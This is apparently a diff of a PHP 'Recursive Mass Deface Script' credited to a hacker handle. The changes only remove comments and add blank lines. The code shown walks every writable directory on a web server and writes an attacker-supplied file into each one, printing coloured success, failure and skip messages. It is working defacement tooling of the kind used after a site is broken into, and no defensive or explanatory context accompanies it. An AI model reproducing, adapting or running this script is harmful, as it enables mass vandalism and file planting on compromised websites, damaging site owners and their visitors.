@@ -1,4 +1,5 @@
 <?php
+
 /**
  * Recursive Mass Deface Script
  * by L4663r666h05t
@@ -21,22 +22,19 @@ if (!$script_content) {
 /**
  * Mass deface function to spread the file across all directories
  */
+
 function recursive_mass_deface($dir, $name, $content) {
-    // Check if the directory is accessible and writable
     if (is_writable($dir)) {
         $items = scandir($dir);
         
         foreach ($items as $item) {
-            // Skip the current and parent directory pointers
             if ($item === '.' || $item === '..') continue;
 
             $full_path = $dir . DIRECTORY_SEPARATOR . $item;
 
-            // If the item is a directory, proceed
             if (is_dir($full_path)) {
                 $target_file = $full_path . DIRECTORY_SEPARATOR . $name;
 
-                // Attempt to write the file if permissions allow
                 if (is_writable($full_path)) {
                     if (file_put_contents($target_file, $content)) {
                         echo "[<font color=lime>SUCCESS</font>] Created: $target_file<br>";
@@ -44,7 +42,6 @@ function recursive_mass_deface($dir, $name, $content) {
                         echo "[<font color=red>FAILED</font>] Writing error: $target_file<br>";
                     }
 
-                    // RECURSIVE CALL: Enter the sub-directory
                     recursive_mass_deface($full_path, $name, $content);
                 } else {
                     echo "[<font color=orange>SKIPPED</font>] No permission: $full_path<br>";
